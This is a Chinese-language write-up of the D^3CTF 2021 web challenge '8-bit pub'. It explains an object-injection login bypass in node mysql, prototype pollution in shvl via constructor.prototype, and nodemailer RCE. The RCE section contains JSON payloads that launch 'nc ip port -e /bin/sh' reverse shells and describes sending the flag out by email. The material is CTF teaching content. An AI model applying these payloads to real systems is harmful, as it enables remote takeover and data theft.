# 8-bit pub

> @ D^3CTF 2021 Web 
### 启动
如果需要，启动前请在`web/utils/mail.js`配置smtp服务器以供测试

start: ``docker-compose up -d``

### Write Up
#### 登入admin

通过简单的审计，发现要登入管理员端，需要用户名为admin
定位到数据库的操作代码
![](https://i.imgur.com/ZHOe0pv.png)


注意到这里的查询语句使用了占位符的写法，是没法进行直接的注入的
但是通过阅读node mysql库的文档，可以发现，当传入的变量为Object时，参数会被转化成``` `key` = value ```的格式拼入
那么就可以利用这点构造出`{"username":"admin", "password":{"password": true}}`的参数，这里只要传入对象的key值为表中的password列即可，那么sql语句变为```SELECT * FROM users WHERE username = 'admin' AND password = `password` = true```，也就是说构造出了一个万能密码

#### 原型链污染

登入admin后可以发邮件，通过审计发邮件处的代码，留意到这里使用了一个名为`shvl`的库进行赋值
![](https://i.imgur.com/3fZF5Hk.png)


前段时间这个库爆过原型链污染，在最新的版本中作者已经修复，但是看修复代码可以发现

![](https://i.imgur.com/OpSkDRe.png)


作者的修复仅仅是过滤了`__proto__`属性，我们用`constructor.prototype`仍可进行污染，可以直接污染到Object类

#### RCE
接下来对nodemailer的rce就有两种方法了

首先是较多队伍采用的，控制args变量的方法

通过阅读源码发现，nodemailer里有一处调用系统命令sendmail发送邮件的代码

![](https://i.imgur.com/cNkhgZQ.png)


其args参数依次来自

![](https://i.imgur.com/lawLmZE.png)

![](https://i.imgur.com/ScGah8r.png)


而这里，我们只要对Object.args进行污染，就可以控制到最终执行系统命令的参数

同时，题目中采用的是默认的smtp的transport，要让执行流程进入sendmail命令的逻辑，还需要污染Object.sendmail为true

![](https://i.imgur.com/C48pex1.png)


payload为：
```json
{
  "constructor.prototype.path": "/bin/sh",
  "constructor.prototype.args": [
    "-c",
    "nc ip port -e /bin/sh"
  ],
  "constructor.prototype.sendmail": true
}
```

这里有些队伍没有反弹shell，直接把`/readflag`的输出结果写到/tmp目录下，然后用发邮件附件的方式带出，形如
`{"to":"i@example.com","subject":"flag","attachments":[{"filename":"flag.txt","path":"/tmp/xxxx"}`
这样也比较有趣

另一种做法是安全员研究员posix提出的，对环境变量进行污染，以实现rce的做法:
[https://blog.p6.is/Abusing-Environment-Variables/](https://blog.p6.is/Abusing-Environment-Variables/)

阅读child_process的代码：https://github.com/nodejs/node/blob/master/lib/child_process.js#L502 可以发现，如果我们同时污染`shell`和`env`两个变量，就可以通过一些系统命令的环境变量来rce
比如较为常用的NODE_DEBUG环境变量，pyload为：
```json
{
  "constructor.prototype.env": {
    "NODE_DEBUG": "require('child_process').execSync('nc ip port -e /bin/sh')//",
    "NODE_OPTIONS": "-r /proc/self/environ"
  },
  "constructor.prototype.sendmail": true,
  "constructor.prototype.shell": "/bin/node"
}
```
